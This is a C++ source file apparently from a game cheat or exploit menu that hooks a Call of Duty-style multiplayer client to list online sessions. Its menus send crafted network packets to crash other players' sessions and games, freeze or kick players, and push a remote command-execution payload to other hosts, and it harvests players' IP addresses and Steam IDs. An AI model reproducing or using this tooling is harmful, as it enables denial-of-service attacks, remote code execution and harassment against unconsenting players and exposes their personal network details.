#include "dependencies/stdafx.hpp"
#include "session.hpp"

namespace session
{
	namespace
	{
		bool fetch{ true };
		std::unordered_map<game::netadr_t, std::vector<player_info>> players;
		std::vector<session_info> sessions;

		session_info* get_by_ip(const game::netadr_t& target)
		{
			const auto entry = std::find_if(sessions.begin(), sessions.end(), [=](const auto& s) { return game::NET_CompareAdr(target, s.response.netadr); });

			if (entry != sessions.end())
			{
				return &*entry;
			}

			return nullptr;
		}
		
		bool fetch_sessions()
		{
			if (!game::iwnet_searching)
				return false;

			if (!fetch)
				return false;

			const auto result = game::IWNet_AddCommand(0, 7, nullptr);

			if (!result)
			{
				PRINT_LOG("Adding IWNet search command failed.");
			}

			return result;
		}

		void register_session(const command::args& args, const game::netadr_t& netadr)
		{
			session_info session{};
			session.last_online = std::chrono::system_clock::now();
			session.response.netadr = netadr;
			session.response.ingame = utils::atoi<bool>(args[3]);
			session.response.clients = { std::min(utils::atoi<uint32_t>(args[4]), 18u), std::min(utils::atoi<uint32_t>(args[5]), 18u) };

			const auto fetch_session = utils::atoi(args[2]) == friends::FETCHSESSION_NONCE;
			const auto s = session::get_by_ip(netadr);

			if (fetch_session && s)
				*s = session; 

			if (fetch_session || s)
				return;

			sessions.emplace_back(std::move(session));
		}
		
		void refresh_session_list()
		{
			for (auto i = sessions.begin(); i != sessions.end();)
			{
				const auto now = std::chrono::system_clock::now(); 
				const auto diff = now - i->last_online;
				
				if (diff > 15s)
				{
					i = sessions.erase(i);
					continue;
				}

				const auto response = i->response;
				const auto data = session::build_hping(i->response);
				const auto f = friends::get_by_ip(response.netadr);

				if (!f)
				{
					game::net::send_oob(response.netadr, data);
				}

				++i;
			}
		}
	}

	std::string build_hping(const pong_response& response)
	{
		const auto party_id = response.ingame ? 0 : 2;

		return std::to_string(party_id) + "hping " + std::to_string(friends::FETCHSESSION_NONCE);
	}
	
	void draw_session_list(const float width, const float spacing)
	{
		if (ImGui::BeginTabItem("Sessions"))
		{
			const auto party = game::party_data();
			
			ImGui::Checkbox("Fetch sessions", &session::fetch); 
			
			static ImGuiTextFilter filter;
			ImGui::TextUnformatted("Search session");
			filter.Draw("##search_session", width * 0.85f);

			if (ImGui::MenuItem("Delete sessions", nullptr, nullptr, !sessions.empty()))
			{
				sessions.clear();
			}
			
			ImGui::Separator();

			ImGui::BeginColumns("Sessions", 2, ImGuiColumnsFlags_NoResize);

			ImGui::TextUnformatted("Session");
			ImGui::NextColumn();
			ImGui::SetColumnOffset(-1, width - ImGui::CalcTextSize("Clients").x);
			ImGui::TextUnformatted("Clients");
			ImGui::NextColumn();

			ImGui::Separator();

			std::vector<session_info> sorted_sessions{ sessions };
			std::sort(sorted_sessions.begin(), sorted_sessions.end());

			for (const auto& session : sorted_sessions)
			{
				const auto response = session.response;
				const auto netadr = response.netadr;
				const auto ip_string = netadr.to_string(true); 
				const auto label = ip_string + "##session";
				
				if (!filter.PassFilter(ip_string))
					continue; 

				ImGui::AlignTextToFramePadding(); 
				
				const auto selected = ImGui::Selectable(label);

				if (const auto f = friends::get_by_ip(netadr))
				{
					ImGui::SameLine(0, spacing);
					ImGui::TextColored(ImVec4(0.0f, 0.5f, 1.0f, 0.95f), "(%s)", f->name.data());
				}

				if (game::NET_CompareAdr(party->currentHost.adr, netadr))
				{
					ImGui::SameLine(0, spacing);
					ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.5f, 0.95f), "[Current]");
				}

				const auto popup = "session_popup##" + ip_string;

				if (selected)
					ImGui::OpenPopup(popup.data());

				if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
				{
					if (ImGui::MenuItem(ip_string))
					{
						ImGui::LogToClipboardUnformatted(ip_string);
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Join session"))
					{
						game::join_lobby_ip(ip_string);
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Crash session"))
					{
						exploit::send_relay_crash(response.netadr);

						if (response.ingame)
							exploit::send_defer_packet_to_client_crash(response.netadr);
					}

					if (ImGui::BeginMenu("Send payload##" + ip_string))
					{
						const auto rce_cmd = menu::get_rce_commands(width);

						if (ImGui::MenuItem("Execute"))
						{
							if (const auto args = utils::string::split(rce_cmd.first, ' '); !args.empty())
							{
								exploit::join_party::send_payload(netadr, rce_cmd.second, args);
							}
							else
							{
								exploit::join_party::send_payload(netadr, rce_cmd.second, {});
							}
						}

						ImGui::EndMenu();
					}

					ImGui::Separator();

					if (ImGui::BeginMenu("List players##" + ip_string))
					{
						if (ImGui::MenuItem("Refresh players"))
						{
							std::thread{ exploit::join_party::send_party_members, netadr }.detach();
						}

						ImGui::Separator();
						
						for (const auto& player : players[netadr])
						{
							const auto client_num = player.client_num;
							const auto xuid = std::to_string(player.steam_id);
							const auto ip_string = player.adr.to_string(true);
							const auto label = player.name + "##player" + xuid;
							const auto selected = ImGui::Selectable(label);
							const auto popup = "session_player_popup##" + xuid;

							if (selected)
								ImGui::OpenPopup(popup.data());

							if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
							{
								ImGui::MenuItem(player.name + "##session_player_menu_item" + xuid, nullptr, false, false);

								if (ImGui::IsItemClicked())
								{
									ShellExecuteA(0, "open", ("https://steamcommunity.com/profiles/" + xuid).data(), 0, 0, SW_SHOWNORMAL);
								}

								if (ImGui::IsItemHovered())
								{
									ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
								}

								ImGui::Separator();

								if (ImGui::MenuItem(xuid))
								{
									ImGui::LogToClipboardUnformatted(xuid);
								}

								if (ImGui::MenuItem(ip_string, nullptr, nullptr, false))
								{
									ImGui::LogToClipboardUnformatted(ip_string);
								}

								ImGui::Separator();

								if (ImGui::MenuItem("Crash game"))
								{
									game::net::send_relay_packet(netadr, client_num, "relay -11111111");
								}

								if (ImGui::MenuItem("Immobilize"))
								{
									game::net::send_relay_packet(netadr, client_num, "requeststats\n");
								}

								if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, response.ingame))
								{
									game::net::send_relay_packet(netadr, client_num, "mstart");
								}

								if (ImGui::MenuItem("Kick player"))
								{
									if (response.ingame)
									{
										exploit::join_party::send_payload(netadr, "kick", { std::to_string(client_num), "EXE_PLAYERKICKED" });

										game::net::send_relay_packet(netadr, client_num, "error\nEXE_PLAYERKICKED");
										game::net::send_relay_packet(netadr, client_num, "hostquit");
									}
									else
									{
										game::net::send_relay_packet(netadr, client_num, "roundsdone");
									}
								}
								
								ImGui::EndPopup();
							}
						}
						
						ImGui::EndMenu();
					}

					ImGui::EndPopup();
				}

				ImGui::NextColumn();

				ImGui::AlignTextToFramePadding();

				ImGui::Text("%i / %i", response.clients.first, response.clients.second);

				ImGui::NextColumn();

				if (ImGui::GetColumnIndex() == 0)
				{
					ImGui::Separator();
				}
			}

			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}

	void __cdecl party_add_party_to_list(game::PartyData_s* party, game::XSESSION_INFO *info, int a3, int a4, int a5, int a6)
	{
		session::register_session({}, info->hostAddress.get_addr());
		return reinterpret_cast<decltype(&party_add_party_to_list)>(0x004D2E20)(party, info, a3, a4, a5, a6);
	}

	void iwnet_write_session_search(LocalClientNum_t localClientNum, uintptr_t commandData, game::msg_t* msg)
	{
		game::MSG_WriteData(msg, reinterpret_cast<char*>(0x06646D40), 84);
		reinterpret_cast<void(*)(int, int, game::msg_t*)>(0x006240C0)(5, commandData, msg);

		const auto party = game::party_data();
		game::Party_ClearPartyList(party);
		
		*reinterpret_cast<int*>(commandData + 12) = 0;
		ZeroMemory(reinterpret_cast<void*>(commandData + 16), sizeof uint64_t);

		game::MSG_WriteByte(msg, *reinterpret_cast<uint8_t*>(0x062EC848)); // playlist version number
		game::MSG_WriteByte(msg, 1); // playlist ID
		game::MSG_WriteByte(msg, 24); // max playlist ID
		game::MSG_WriteByte(msg, 151); // protocol version
		game::MSG_WriteByte(msg, 155); // persistent data def version
		game::MSG_WriteByte(msg, 0); // number of players in party
		game::MSG_WriteLong(msg, party->map_pack_flags());
	}

	int get_protocol_version()
	{
		return 151;
	}

	void initialize()
	{
		utils::hook::nop(0x006249A0, 6); // IWNet_HandleSearchSuccess -> Party_IsRunning(g_lobbyData)
		//utils::hook::nop(0x00624A3F, 2);

		utils::hook::jump(0x005BB7C0, get_protocol_version);
		utils::hook::jump(0x00624D50, iwnet_write_session_search);
		utils::hook::call(0x00624A01, party_add_party_to_list);

		scheduler::loop(fetch_sessions, scheduler::pipeline::main, 1s); 
		scheduler::loop(refresh_session_list, scheduler::pipeline::main, 1s);
		
		network::on_command("hpong", [](const auto& args, const auto& target, const auto&)
		{
			session::register_session(args, target);

			if (const auto f = friends::get_by_ip(target))
			{
				f->last_online = std::time(nullptr);
				f->response = { target, utils::atoi<bool>(args[3]) };

				friends::write();
			}

			return utils::atoi(args[2]) == friends::FETCHSESSION_NONCE;
		}); 
		
		network::on_command("coopplayer", [](const auto& args, const auto& target, auto& msg)
		{
			game::PartyMember members[18]{};
			game::MSG_ReadData(&msg, &members, sizeof(game::PartyMember) * 18);

			std::vector<player_info> players_info;
			players_info.reserve(18);
			
			for (size_t i = 0; i < 18; ++i)
			{
				const auto member = members[i];
				
				if (member.status < 2)
					continue;

				players_info.emplace_back(player_info{ i, member.player, member.gamertag, member.xnaddr.get_addr() });
			}

			players[target] = std::move(players_info);

			return true;
		});
	}
}
